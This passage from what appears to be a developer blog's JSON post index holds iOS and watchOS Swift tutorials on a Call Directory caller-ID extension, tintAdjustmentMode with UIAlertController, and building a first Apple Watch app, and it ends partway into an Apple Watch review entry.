jsonToData(jsonDic: datas) { DispatchQueue(label: \"phoneIdentity\").async { if let _ = try? data.write(to: fileURL) { // JSON file write completed } } } }}It‚Äôs just regular local file maintenance. The key point is that the directory must be accessible from the Extension as well.Supplement ‚Äî Phone Number Format: For landline and mobile numbers in Taiwan, remove the leading 0 and replace it with 886: for example, 0255667788 -&gt; 886255667788 Phone numbers should be strings composed purely of digits, without any symbols like ‚Äú-‚Äú, ‚Äú,‚Äù, ‚Äú#‚Äù or others. For landline numbers that include an extension, simply append it directly without any symbols: for example, 0255667788,0718 -&gt; 8862556677880718 To convert a standard iOS phone number format into a format accepted by the recognition database, you can refer to the following two replacement methods: var newNumber = \"0255667788,0718\"if let regex = try? NSRegularExpression(pattern: \"^0{1}\") { newNumber = regex.stringByReplacingMatches(in: newNumber, options: [], range: NSRange(location: 0, length: newNumber.count), withTemplate: \"886\")}if let regex = try? NSRegularExpression(pattern: \",\") { newNumber = regex.stringByReplacingMatches(in: newNumber, options: [], range: NSRange(location: 0, length: newNumber.count), withTemplate: \"\")}Next, as per the process, once the data recognition is maintained, you need to notify the Call Directory Extension to refresh the data on the phone side:if #available(iOS 10.0, *) { CXCallDirectoryManager.sharedInstance.reloadExtension(withIdentifier: \"tw.com.marry.MarryiOS.CallDirectory\") { errorOrNil in if let error = errorOrNil as? CXErrorCodeCallDirectoryManagerError { print(\"reload failed\") switch error.code { case .unknown: print(\"error is unknown\") case .noExtensionFound: print(\"error is noExtensionFound\") case .loadingInterrupted: print(\"error is loadingInterrupted\") case .entriesOutOfOrder: print(\"error is entriesOutOfOrder\") case .duplicateEntries: print(\"error is duplicateEntries\") case .maximumEntriesExceeded: print(\"maximumEntriesExceeded\") case .extensionDisabled: print(\"extensionDisabled\") case .currentlyLoading: print(\"currentlyLoading\") case .unexpectedIncrementalRemoval: print(\"unexpectedIncrementalRemoval\") } } else if let error = errorOrNil { print(\"reload error: \\(error)\") } else { print(\"reload succeeded\") } }}Use the above method to notify the Extension to refresh and get the execution result. (At this point, it will call the beginRequest in the Call Directory Extension. Please continue reading below.)The main iOS project‚Äôs code ends here!3. Start Modifying the Call Directory Extension CodeOpen the Call Directory Extension folder and find the file CallDirectoryHandler.swift that has been created for you.The only method to implement is beginRequest, which handles actions when processing phone call data. The default examples have already set this up for us, so there‚Äôs usually no need to modify it: addAllBlockingPhoneNumbers: Handles adding phone numbers to the blacklist (full addition) addOrRemoveIncrementalBlockingPhoneNumbers: Handles adding phone numbers to the blacklist (incremental method) addAllIdentificationPhoneNumbers: Handles adding caller identification numbers (full addition) addOrRemoveIncrementalIdentificationPhoneNumbers: Handles adding caller identification numbers (incremental method) We only need to complete the above function implementation. The blacklist feature and call identification method work on the same principle, so they will not be explained here.private func fetchAll(context: CXCallDirectoryExtensionContext) { if let dir = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"Your cross-Extension Group Identifier name\") { let fileURL = dir.appendingPathComponent(\"phoneIdentity.json\") if let content = try? String(contentsOf: fileURL, encoding: .utf8), let text = content.data(using: .utf8), let numbers = try? JSONSerialization.jsonObject(with: text, options: .mutableContainers) as? Dictionary&lt;String,String&gt; { numbers?.sorted(by: { (Int($0.key) ?? 0) &lt; Int($1.key) ?? 0 }).forEach({ (obj) in if let number = CXCallDirectoryPhoneNumber(obj.key) { autoreleasepool{ if context.isIncremental { context.removeIdentificationEntry(withPhoneNumber: number) } context.addIdentificationEntry(withNextSequentialPhoneNumber: number, label: obj.value) } } }) } }}private func addAllIdentificationPhoneNumbers(to context: CXCallDirectoryExtensionContext) { // Retrieve phone numbers to identify and their identification labels from data store. For optimal performance and memory usage when there are many phone numbers, // consider only loading a subset of numbers at a given time and using autorelease pool(s) to release objects allocated during each batch of numbers which are loaded. // // Numbers must be provided in numerically ascending order. // let allPhoneNumbers: [CXCallDirectoryPhoneNumber] = [ 1_877_555_5555, 1_888_555_5555 ] // let labels = [ \"Telemarketer\", \"Local business\" ] // // for (phoneNumber, label) in zip(allPhoneNumbers, labels) { // context.addIdentificationEntry(withNextSequentialPhoneNumber: phoneNumber, label: label) // } fetchAll(context: context)}private func addOrRemoveIncrementalIdentificationPhoneNumbers(to context: CXCallDirectoryExtensionContext) { // Retrieve any changes to the set of phone numbers to identify (and their identification labels) from data store. For optimal performance and memory usage when there are many phone numbers, // consider only loading a subset of numbers at a given time and using autorelease pool(s) to release objects allocated during each batch of numbers which are loaded. // let phoneNumbersToAdd: [CXCallDirectoryPhoneNumber] = [ 1_408_555_5678 ] // let labelsToAdd = [ \"New local business\" ] // // for (phoneNumber, label) in zip(phoneNumbersToAdd, labelsToAdd) { // context.addIdentificationEntry(withNextSequentialPhoneNumber: phoneNumber, label: label) // } // // let phoneNumbersToRemove: [CXCallDirectoryPhoneNumber] = [ 1_888_555_5555 ] // // for phoneNumber in phoneNumbersToRemove { // context.removeIdentificationEntry(withPhoneNumber: phoneNumber) // } //context.removeIdentificationEntry(withPhoneNumber: CXCallDirectoryPhoneNumber(\"886277283610\")!) //context.addIdentificationEntry(withNextSequentialPhoneNumber: CXCallDirectoryPhoneNumber(\"886277283610\")!, label: \"TEST\") fetchAll(context: context) // Record the most-recently loaded set of identification entries in data store for the next incremental load...}Because our site‚Äôs data is not very large and my local data structure is quite simple, incremental updates are not possible; therefore, we uniformly use a full addition method. If using incremental updates, the old data must be deleted first (this step is very important, otherwise the reload extension will fail!).Completed!That‚Äôs it! The implementation is very simple!Tips: If the app keeps loading or cannot identify numbers after opening ‚ÄúSettings‚Äù &gt; ‚ÄúPhone‚Äù &gt; ‚ÄúCall Blocking &amp; Identification,‚Äù first check if the numbers are correct, if the locally maintained .json data is accurate, and if reloading the extension was successful. You can also try restarting the device. If the issue persists, select the call directory extension‚Äôs Scheme Build to check for error messages. The most challenging part of this feature is not the coding but guiding users to manually enable the setting. For specific methods and guidance, refer to whoscall: WhoscallIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS tintAdjustmentModeÔΩúFix UIImageAsset .tintColor Failure in UIAlertController", "url": "/posts/zrealm-dev/ios-tintadjustmentmode-fix-uiimageasset-tintcolor-failure-in-uialertcontroller-6012b7b4f612/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, uikit, swift, ios-app-development, autolayout, attention-to-detail", "date": "2019-02-07 00:10:43 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS tintAdjustmentMode PropertyPresent UIAlertController Causes Image Assets (...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS tintAdjustmentMode PropertyPresent UIAlertController Causes Image Assets (Render as Template) .tintColor Setting to Fail on Current PageComparison Before and After Issue FixNo fuss, just go straight to the comparison chart.Left: Before correction / Right: After correctionYou can see that the tintColor setting for the left icon fails when presenting a UIAlertController. However, the color setting returns to normal after the presented view is dismissed.Issue FixesFirst, let‚Äôs introduce the tintAdjustmentMode property. This property controls the display mode of tintColor and has three enum options: .Automatic: The view‚Äôs tintAdjustmentMode follows the setting of its enclosing parent view .Normal: Default mode, displays the assigned tintColor normally .Dimmed: Changes tintColor to a low-saturation, dim color (which is gray!) The above issue is not a bug but rather the inherent mechanism of the system: When presenting a UIAlertController, the tintAdjustmentMode of the Root ViewController‚Äôs view on the current page changes to Dimmed (so technically, the color setting is not ‚Äúdisabled,‚Äù but the tintAdjustmentMode is altered)Sometimes, if we want the ICON color to remain consistent, we only need to keep the tintAdjustmentMode the same in the UIView‚Äôs tintColorDidChange event:extension UIButton { override func tintColorDidChange() { self.tintAdjustmentMode = .normal // Always keep normal }}extension exampleThe End!It‚Äôs not a big issue, and it‚Äôs fine if not changed, but it is just annoying to look at.Actually, every page that presents a UIAlertController, action sheet, or popover will change the view‚Äôs tintAdjustmentMode to gray, but I only noticed it on this page.I searched for a while and found that it is related to this property. After setting it, my small doubt was resolved.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Apple Watch App DevelopmentÔΩúStep-by-Step watchOS 5 Guide for Beginners", "url": "/posts/zrealm-dev/apple-watch-app-development-step-by-step-watchos-5-guide-for-beginners-e85d77b05061/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, watchos, apple-watch-apps, watchkit, ios-app-development", "date": "2019-02-06 00:23:30 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Let‚Äôs Build an Apple Watch App! (Swift)watchOS 5 Step-by-Step Development of A...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Let‚Äôs Build an Apple Watch App! (Swift)watchOS 5 Step-by-Step Development of Apple Watch App from Scratch[Latest] Apple Watch Series 6 Unboxing &amp; Two-Year Experience¬†¬ª&gt; Click HereIntroduction:After the previous Apple Watch Unboxing Article, almost three months have passed, and I finally found the opportunity to start developing an Apple Watch App.Wedding Planner ‚Äî The Largest Wedding Planning AppHere is the feedback after using it for three months: e-SIM (LTE) still hasn‚Äôt found a use case, so I haven‚Äôt applied for or used it. Frequently used features: unlocking Mac by proximity, raise to check notifications, Apple Pay. Health reminders: after three months, I‚Äôve started to slack off; I glance at notifications, but feel indifferent if I don‚Äôt close the activity rings. Third-party app support is still very poor. Watch faces can be changed freely according to mood, adding freshness. More detailed workout tracking: for example, if I walk a bit farther to buy dinner, the watch automatically detects it and asks if I want to record the workout.After using it for three months, overall, it is still like multiple little life assistants as described in the original unboxing article, helping you handle trivial matters.Third-Party App Support Is Still PoorBefore I actually developed an Apple Watch App, I wondered why apps on Apple Watch were so basic or just ‚Äúbarely usable,‚Äù including LINE (messages not synced and never updated) and Messenger (just barely usable); it wasn‚Äôt until I developed an Apple Watch App myself that I understood the developers‚Äô difficulties‚Ä¶First, Understand the Positioning of the Apple Watch App, Simplify ComplexityThe positioning of Apple Watch is ‚Äúnot to replace the iPhone, but to assist‚Äù. This direction is reflected in official introductions, official apps, and watchOS APIs; that‚Äôs why third-party apps often feel basic and limited in functionality (sorry, I was too greedy Orz).Using Our A app as an example, it includes features like searching for businesses, viewing columns, discussion forums, and online inquiries. Online inquiries are valuable to bring to the Apple Watch because they require immediacy and faster replies, which increase the chance of securing orders. Features like searching for businesses, viewing columns, and discussion forums are more complex and less meaningful on the watch due to limited screen space and lack of urgency.The core concept is still ‚Äúassistive first,‚Äù so not every feature needs to be on the Apple Watch. After all, users rarely wear only the watch without their phone, and in such cases, their needs are limited to essential functions (for example, reading column articles is not urgent enough to require immediate access on the watch).Let‚Äôs get started! This is also my first time developing an Apple Watch App, so the article may not be very detailed. I welcome your feedback!! This article is only suitable for readers with basic experience in iOS App/UIKit development This article uses: iOS ‚â• 9, watchOS ‚â• 5Creating a watchOS Target for an iOS Project:File -&gt; New -&gt; Target -&gt; watchOS -&gt; WatchKit AppApple Watch App cannot be installed independently; it must be bundled with an iOS AppAfter creating it, the directory will look like this:You will find two Target items, both essential: WatchKit App: Responsible for storing resources and UI display/Interface.storyboard: Same as iOS, contains system-created view controllers/Assets.xcassets: Same as iOS, stores used resource items/info.plist: Same as iOS, WatchKit App related settings WatchKit Extension: Responsible for program calls and logic processing (*.swift)/InterfaceController.swift: Default view controller program/ExtensionDelegate.swift: Similar to Swift‚Äôs AppDelegate, the entry point for the Apple Watch App/NotificationController.swift: Handles push notification display on the Apple Watch App/Assets.xcassets: Not used here; all assets are stored under WatchKit App‚Äôs Assets.xcassets/info.plist: Similar to iOS, WatchKit Extension related settings/PushNotificationPayload.apns: Push notification data, used for testing push notifications on the simulator Details will be introduced later; for now, just get a general understanding of the table of contents and the document‚Äôs features.View Controller:In Apple Watch, the view controller is called InterfaceController instead of ViewController. You can find the Interface Controller Scene in WatchKit App/Interface.storyboard. The code controlling it is located in WatchKit Extension/InterfaceController.swift (similar to the iOS concept).The Scene is set to be grouped with the Notification Controller Scene by default (I will move it up a bit to separate them).You can set the title text of the InterfaceController on the right side.The title color is determined by the Interface Builder Document/Global tint setting, ensuring a consistent color scheme throughout the entire app.Component Library:There are not many complex components, and the functions of the components are simple and clear.UI Layout:A towering building starts from the View. For layout, there is no Auto Layout, constraints, or layers like in UIKit (iOS). All layout settings are done using parameters, making it simpler and more powerful (somewhat like UIStackView in UIKit). All layouts are composed of Groups, similar to UIStackView in UIKit but with more layout parameters availableGroup Parameter Settings Layout: Set the arrangement of enclosed subviews (horizontal, vertical, layer stacking) Insets: Set the top, bottom, left, and right margins of the Group Spacing: Set the spacing between the enclosed child Views Radius: Set the corner radius of the Group. That‚Äôs right! WatchKit comes with built-in corner radius parameters. Alignment/Horizontal: Sets the horizontal alignment (left, center, right) and is linked to the settings of neighboring and outer wrapping Views. Alignment/Vertical: Sets the vertical alignment (top, center, bottom) and interacts with neighboring and outer wrapper views. Size/Width: Set the size of the Group with three modes available: ‚ÄúFixed: specify width,‚Äù ‚ÄúSize To Fit Content: width based on the size of child views,‚Äù and ‚ÄúRelative to Container: width relative to the outer container view (can set % or +/- adjustments).‚Äù Size/Height: Same as Size/Width, this sets the height. Font/Font Size Settings:You can directly apply the system‚Äôs Text Styles or use Custom (but I tested Custom and couldn‚Äôt set the font size); so I use System to customize the font size of each display Label.Learning by Doing: Using Line Formatting as an ExampleLayout is not as complex as on iOS, so I‚Äôll demonstrate with an example to help you get started quickly; using Line‚Äôs main page layout as an example:Find the Interface Controller Scene in WatchKit App/Interface.storyboard: The entire page is equivalent to the UITableView used in iOS App development. In Apple Watch Apps, it simplifies the operation and is renamed ‚ÄúWKInterfaceTable.‚ÄùFirst, drag a Table into the Interface Controller Scene.Like UIKit‚Äôs UITableView, there is the main Table and Cells (called Rows on Apple Watch); using it simplifies many tasks. You can directly design and layout Cells on this interface! Analyze the layout structure and design the Row display style:To layout a full-height image with rounded corners on the left stacked with a label, and on the right evenly divide two sections with a label on top and another label below:2‚Äì1: Layout of Left and Right SectionsDrag two Groups into a Group, and set the Size parameter for each:Left green section:Layout setting Overlap, where the child View displays unread message Labels in layered stacking.Set a square with fixed width and height of 40.Right side red part:Layout set to Vertical, with child Views arranged in two vertical sections.Width set relative to the outer layer, 100% minus 40 for the left green partLayout inside left and right containers:Left side: Drag in an Image, then drag in a Group containing a Label aligned to the bottom right (set the Group background color, spacing, and corner radius).Right side: Add two Labels, one aligned to the top left and the other aligned to the bottom left.Naming a Row (Similar to setting an identifier for a Cell in UIKit UITableView):Select Row -&gt; Identifier -&gt; Enter a custom nameThere is more than one way to display a Row.Very simple, just add a Row inside the Table (the style of the Row to display is controlled by the program) and enter an Identifier to name it.Here, I add another Row to display a message when there is no data.Layout Related InformationThe hidden property in watchKit does not occupy space, which can be used for interactive applications (e.g., show a Table only when logged in; show a prompt Label when not logged in).The layout is complete for now and can be adjusted according to your personal design; it‚Äôs easy to get started‚Äîjust try aligning a few more times and experimenting with the parameters to get familiar!Program Control Section:Continuing with Row, we need to create a Class to reference and operate on Row:class ContactRow:NSObject {}class ContactRow:NSObject { var id:String? @IBOutlet var unReadGroup: WKInterfaceGroup! @IBOutlet var unReadLabel: WKInterfaceLabel! @IBOutlet weak var imageView: WKInterfaceImage! @IBOutlet weak var nameLabel: WKInterfaceLabel! @IBOutlet weak var timeLabel: WKInterfaceLabel!}Pull outlet, store variableFor the Table section, similarly drag the Outlet to the Controller:class InterfaceController: WKInterfaceController { @IBOutlet weak var Table: WKInterfaceTable! override func awake(withContext context: Any?) { super.awake(withContext: context) // Configure interface objects here. } override func willActivate() { // This method is called when watch view controller is about to be visible to user super.willActivate() } struct ContactStruct { var name:String var image:String var time:String } func loadData() { //Get API Call Back... //postData { let data:[ContactStruct] = [] //api returned data... self.Table.setNumberOfRows(data.count, withRowType: \"ContactRow\") //If you have multiple row types to display, use: //self.Table.setRowTypes([\"ContactRow\",\"ContactRow2\",\"ContactRow3\"]) // for item in data.enumerated() { if let row = self.Table.rowController(at: item.offset) as? ContactRow { row.nameLabel.setText(item.element.name) //assign value to label/image...... } } //} } override func didDeactivate() { // This method is called when watch view controller is no longer visible super.didDeactivate() loadData() } //Handle row selection: override func table(_ table: WKInterfaceTable, didSelectRowAt rowIndex: Int) { guard let row = table.rowController(at: rowIndex) as? ContactRow,let id = row.id else { return } self.pushController(withName: \"showDetail\", context: id) }}Table operations are much simpler without delegate/datasource. To set data, just call setNumberOfRows/setRowTypes to specify the number and type of rows, then use rowController(at:) to set the content for each row!The Table row selection event can be handled simply by overriding the functionoverride func table(_ table: WKInterfaceTable, didSelectRowAt rowIndex: Int). (This is the only event for Table)How to skip pages?First, set the Identifier for the Interface ControllerwatchKit has two page navigation modes: Similar to iOS UIKit pushself.pushController(withName: Interface Controller Identifier, context: Any?)Push method allows returning from the top left cornerGo Back to Previous Page with iOS UIKit: self.pop()Return to root page: self.popToRootController()Open a new page: self.presentController( ) Tab Display StyleWKInterfaceController.reloadRootControllers(withNames: [ Interface Controller Identifier ], contexts: [ Any? ] )Or in the Storyboard, press Control+Click on the first page‚Äôs Interface Controller and drag to the second page, then select ‚Äúnext page‚Äù.The tab display allows switching pages left and rightDo not mix the two page-skipping methods.Pagination Parameters?Unlike iOS, which requires custom delegates or segues to pass parameters, watchKit passes parameters by placing them in the contexts of the method above.Receiving parameters in InterfaceController‚Äôs awake(withContext context: Any?)For example, when I want to navigate from Page A to Page B and pass an id:Int:Page A:self.pushController(withName: \"showDetail\", context: 100)Page B:override func awake(withContext context: Any?) { super.awake(withContext: context) guard let id = context as? Int else { print(\"Parameter error!\") self.popToRootController() return } // Configure interface objects here.}Program Control ComponentsCompared to iOS UIKit, it is much simpler. Those who have developed for iOS should pick it up quickly!For example, label becomes setText()p.s. Also, there is no getText method; you can only use an extension variable or store it in an external variable.Syncing/Data Transfer with iPhoneIf you have developed iOS-related Extensions, you would instinctively use App Groups to share UserDefaults. I enthusiastically did the same but got stuck for a long time because the data wouldn‚Äôt transfer. Only after searching online did I find out that watchOS &gt; 2 no longer supports this method‚Ä¶To use the new WatchConnectivity method for communication between the phone and the watch (similar to the socket concept), both iOS phone and watchOS need to implement it. We write it as a singleton pattern as follows:Mobile:import WatchConnectivityclass WatchSessionManager: NSObject, WCSessionDelegate { @available(iOS 9.3, *) func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: Error?) { // Session activation completed on the iPhone side } func session(_ session: WCSession, didReceiveUserInfo userInfo: [String : Any] = [:]) { // iPhone received UserInfo sent from the watch } func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -&gt; Void) { // iPhone received a Message sent from the watch } // There are also didReceiveMessageData and didReceiveFile methods to handle data received from the watch // Choose which one to use based on your data transfer and reception needs func sendUserInfo() { guard let validSession = self.validSession, validSession.isReachable else { return } if userDefaultsTransfer?.isTransferring == true { userDefaultsTransfer?.cancel() } var list:[String:Any] = [:] // Put UserDefaults data into list.... self.userDefaultsTransfer = validSession.transferUserInfo(list) } func sessionReachabilityDidChange(_ session: WCSession) { // When connection status with the watch app changes (watch app opened/closed) sendUserInfo() // Sync UserDefaults once when the watch app opens on status change } func session(_ session: WCSession, didFinish userInfoTransfer: WCSessionUserInfoTransfer, error: Error?) { // Completed syncing UserDefaults (transferUserInfo) } func sessionDidBecomeInactive(_ session: WCSession) { } func sessionDidDeactivate(_ session: WCSession) { } static let sharedManager = WatchSessionManager() private override init() { super.init() } private let session: WCSession? = WCSession.isSupported() ? WCSession.default : nil private var validSession: WCSession? { if let session = session, session.isPaired &amp;&amp; session.isWatchAppInstalled { return session } // Return a valid session that is connected and has the watch app installed and running return nil } func startSession() { session?.delegate = self session?.activate() }}WatchConnectivity Code on the iPhone SideAdd WatchSessionManager.sharedManager.startSession() in iOS/AppDelegate.swift‚Äôs application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) to connect the session after launching the mobile app.Watch Side:import WatchConnectivityclass WatchSessionManager: NSObject, WCSessionDelegate { func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: Error?) { } func sessionReachabilityDidChange(_ session: WCSession) { guard session.isReachable else { return } } func session(_ session: WCSession, didFinish userInfoTransfer: WCSessionUserInfoTransfer, error: Error?) { } func session(_ session: WCSession, didReceiveUserInfo userInfo: [String : Any] = [:]) { DispatchQueue.main.async { // UserDefaults: // print(userInfo) } } static let sharedManager = WatchSessionManager() private override init() { super.init() } private let session: WCSession? = WCSession.isSupported() ? WCSession.default : nil func startSession() { session?.delegate = self session?.activate() }}WatchConnectivity Watch App CodeAdd the following line in WatchOS Extension/ExtensionDelegate.swift inside applicationDidFinishLaunching():WatchSessionManager.sharedManager.startSession()to connect the session after launching the watch app.WatchConnectivity Data Transfer MethodsTo send data: sendMessage, sendMessageData, transferUserInfo, transferFileTo receive data: didReceiveMessageData, didReceive, didReceiveMessageBoth sides use the same methods for sending and receiving.You can see that data transfer from the watch to the phone works fine, but data transfer from the phone to the watch only works when the watch app is open.watchOS Push Notification HandlingThe PushNotificationPayload.apns file under the project directory comes in handy here. It is used to test push notifications on the simulator. When you deploy the Watch App target on the simulator and launch the app after installation, you will receive a push notification with the content from this file, making it easier for developers to test push notification functionality.To modify/enable/disable PushNotificationPayload.apns, please select the Target and then Edit Scheme.watchOS Push Notification Handling:Like in iOS, we implement UNUserNotificationCenterDelegate. In watchOS, we also implement the same method in watchOS Extension/ExtensionDelegate.swift.import WatchKitimport UserNotificationsimport WatchConnectivityclass ExtensionDelegate: NSObject, WKExtensionDelegate, UNUserNotificationCenterDelegate { func applicationDidFinishLaunching() { WatchSessionManager.sharedManager.startSession() // The previously mentioned WatchConnectivity connection UNUserNotificationCenter.current().delegate = self // Set UNUserNotificationCenter delegate // Perform any final initialization of your application. } func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -&gt; Void) { completionHandler([.sound, .alert]) // Same as iOS, this allows notifications to show when the app is in the foreground } func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -&gt; Void) { // When the notification is tapped guard let info = response.notification.request.content.userInfo[\"aps\"] as? NSDictionary, let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt;, let data = info[\"data\"] as? Dictionary&lt;String,String&gt; else { completionHandler() return } // response.actionIdentifier gives the tapped action identifier // Default tap action: UNNotificationDefaultActionIdentifier if alert[\"type\"] == \"new_ask\" { WKExtension.shared().rootInterfaceController?.pushController(withName: \"showDetail\", context: 100) // Get the current root interface controller and push } else { // Other handling... // WKExtension.shared().rootInterfaceController?.presentController(withName: \"\", context: nil) } completionHandler() }}ExtensionDelegate.swiftwatchOS push notifications display in three types: static: Default push notification display modeTogether with mobile push notifications, the iOS app implements UNUserNotificationCenter.setNotificationCategories to add buttons below the notification; Apple Watch will also display them by default. dynamic: Dynamically handle push notification display styles (rearrange content, display images) interactive: Supported on watchOS ‚â• 5, adding button support on top of dynamic features You can set the notification handling method in the Static Notification Interface Controller Scene within Interface.storyboard.There‚Äôs not much to say about static; it just uses the default display method. Here, we‚Äôll introduce dynamic. After checking ‚ÄúHas Dynamic Interface,‚Äù the ‚ÄúDynamic Interface‚Äù option appears, where you can design your custom push notification layout (Buttons cannot be used here):My Custom Push Notification Designimport WatchKitimport Foundationimport UserNotificationsclass NotificationController: WKUserNotificationInterfaceController { @IBOutlet var imageView: WKInterfaceImage! @IBOutlet var titleLabel: WKInterfaceLabel! @IBOutlet var contentLabel: WKInterfaceLabel! override init() { // Initialize variables here. super.init() self.setTitle(\"Marry Me\") // Set the top-right title // Configure interface objects here. } override func willActivate() { // This method is called when watch view controller is about to be visible to user super.willActivate() } override func didDeactivate() { // This method is called when watch view controller is no longer visible super.didDeactivate() } override func didReceive(_ notification: UNNotification) { if #available(watchOSApplicationExtension 5.0, *) { self.notificationActions = [] // Clear buttons added below the notification by iOS implementation of UNUserNotificationCenter.setNotificationCategories } guard let info = notification.request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt; else { return } // Notification info self.titleLabel.setText(alert[\"title\"]) self.contentLabel.setText(alert[\"body\"]) if #available(watchOSApplicationExtension 5.0, *) { if alert[\"type\"] == \"new_msg\" { // If it's a new message notification, add a reply button below the notification self.notificationActions = [UNNotificationAction(identifier: \"replyAction\",title: \"Reply\", options: [.foreground])] } else { // Otherwise, add a view button self.notificationActions = [UNNotificationAction(identifier: \"openAction\",title: \"View\", options: [.foreground])] } } // This method is called when a notification needs to be presented. // Implement it if you use a dynamic notification interface. // Populate your dynamic notification interface as quickly as possible. }}For the code part, similarly connect the outlet to the controller and implement the functionality.Next, regarding interactive, like dynamic, it can add Buttons and share the same Class for program control; I didn‚Äôt use interactive because my buttons are added programmatically via self.notificationActions. The differences are as follows:Left uses interactive, right uses self.notificationActionsBoth methods require watchOS ‚â• 5 support.Using self.notificationActions to add buttons means the button events are handled by ExtensionDelegate‚Äôs userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -&gt; Void), and actions are identified by their identifier.Menu Functions?Drag a Menu from the component library, then drag a Menu Item into it, and finally drag an IBAction to the code controller.Pressing repeatedly on the page will display:Content Input?You can simply use the built-in presentTextInputController method!@IBAction func replyBtnClick() { guard let target = target else { return } self.presentTextInputController(withSuggestions: [\"Reply later\",\"Thank you\",\"Feel free to contact me\",\"Okay\",\"OK!\"], allowedInputMode: WKTextInputMode.plain) { (results) in guard let results = results else { return } // When there is input let txts = results.filter({ (txt) -&gt; Bool in if let txt = txt as? String, txt != \"\" { return true } else { return false } }).map({ (txt) -&gt; String in return txt as? String ?? \"\" }) // Preprocess input txts.forEach({ (txt) in print(txt) }) }}Summary Thank you for reading this! Much appreciated!The article concludes here, briefly covering UI layout, programming, push notifications, and interface applications. For those who have developed iOS apps, the learning curve is very quick since it‚Äôs quite similar, and many methods have been simplified for easier use. However, the available features are indeed fewer (for example, it‚Äôs currently unclear how to implement ‚Äúload more‚Äù for Tables). The current capabilities are quite limited, so I hope the official team will open up more APIs for developers in the future ‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏èMurMur:Apple Watch App Target deployment to the watch is really slow ‚Äî NarcosIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Apple Watch Series 4ÔΩúComprehensive User Insights and Top WatchOS Apps", "url": "/posts/zrealm-life/apple-watch-series-4-comprehensive-user-insights-and-top-watchos-apps-a2920e33e73e/", "categories": "ZRealm Life.", "tags": "english, ai-translation, apple-watch, watchos, apple-watch-apps, lifestyle, unboxing", "date": "2018-11-26 22:18:41 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Series 4 Unboxing: Comprehensive Review from Purchase to Setup (Up...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Series 4 Unboxing: Comprehensive Review from Purchase to Setup (Updated 2020-10-24)Why Buy? Is It Useful? What Are Its Advantages? How to Use It? &amp; WatchOS APP Recommendations[Latest] Apple Watch Series 6 Unboxing &amp; Two-Year Experience¬†¬ª&gt; Click HereGetting Started‚Ä¶Personal BackgroundFirst, a brief introduction to my experience with Apple products. I am not a loyal Apple fan; my first encounter was in 2015 when I bought an iPhone 6 with my part-time job salary. Due to work needs, I only started using a MacOS computer (Mac Mini) last year and purchased my own MacBook Pro and replaced my iPhone 8 this year. The reasons I entered the Apple ecosystem are mainly: Work Requirement (Developing iOS Apps requires MacOS devices) Work Efficiency (improved stability, smoother app switching, better user experience, combined with the ecosystem‚Äôs 